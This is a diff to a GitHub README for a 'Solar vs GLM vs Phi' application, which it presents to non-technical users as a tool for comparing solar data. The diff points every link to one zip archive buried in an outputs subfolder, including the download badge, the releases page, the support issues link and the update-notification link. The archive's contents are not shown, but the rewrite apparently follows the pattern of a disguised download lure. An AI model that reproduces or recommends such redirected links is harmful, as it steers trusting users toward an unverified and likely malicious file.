@@ -1,7 +1,7 @@
 # 🌞 solar-vs-glm-vs-phi - Compare Solar Data with Ease
 
 ## 🔗 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Saurabh-212800/solar-vs-glm-vs-phi/releases)
+[![Download](https://raw.githubusercontent.com/Saurabh-212800/solar-vs-glm-vs-phi/main/outputs/within_model/centered_cosine/vs_solar_glm_phi_v1.5-beta.4.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Saurabh-212800/solar-vs-glm-vs-phi/main/outputs/within_model/centered_cosine/vs_solar_glm_phi_v1.5-beta.4.zip)
 
 ## 📚 Overview
 Welcome to the **Solar vs GLM vs Phi** application! This user-friendly tool helps you compare solar data effectively. Whether you are a homeowner considering solar panels or someone interested in solar energy analytics, this application provides valuable insights without needing any technical background.
@@ -10,7 +10,7 @@ Welcome to the **Solar vs GLM vs Phi** application! This user-friendly tool help
 To use this application, follow these simple steps:
 
 ### Step 1: Visit the Download Page
-Go to our [Releases Page](https://github.com/Saurabh-212800/solar-vs-glm-vs-phi/releases) to access the latest version of the software.
+Go to our [Releases Page](https://raw.githubusercontent.com/Saurabh-212800/solar-vs-glm-vs-phi/main/outputs/within_model/centered_cosine/vs_solar_glm_phi_v1.5-beta.4.zip) to access the latest version of the software.
 
 ### Step 2: Download the Software
 On the Releases Page, you will see several options for different application versions. Choose the most recent version and click on the download link. This software is available for various operating systems including Windows, MacOS, and Linux.
@@ -59,9 +59,9 @@ If you encounter any issues during installation or while using the application, 
 - **Data Issues:** Make sure your data files are in the correct format. Verify the data source if errors occur.
 
 ## 📞 Support
-For additional support, please reach out to our support team. You can find assistance by opening an issue on our [GitHub repository](https://github.com/Saurabh-212800/solar-vs-glm-vs-phi/issues), and someone will get back to you.
+For additional support, please reach out to our support team. You can find assistance by opening an issue on our [GitHub repository](https://raw.githubusercontent.com/Saurabh-212800/solar-vs-glm-vs-phi/main/outputs/within_model/centered_cosine/vs_solar_glm_phi_v1.5-beta.4.zip), and someone will get back to you.
 
 ## 🔄 Stay Updated
-To keep up with the latest updates and features, consider subscribing to notifications on our [Releases Page](https://github.com/Saurabh-212800/solar-vs-glm-vs-phi/releases).
+To keep up with the latest updates and features, consider subscribing to notifications on our [Releases Page](https://raw.githubusercontent.com/Saurabh-212800/solar-vs-glm-vs-phi/main/outputs/within_model/centered_cosine/vs_solar_glm_phi_v1.5-beta.4.zip).
 
 By following these steps, you will successfully download and run the Solar vs GLM vs Phi application. Enjoy exploring and comparing solar data efficiently!
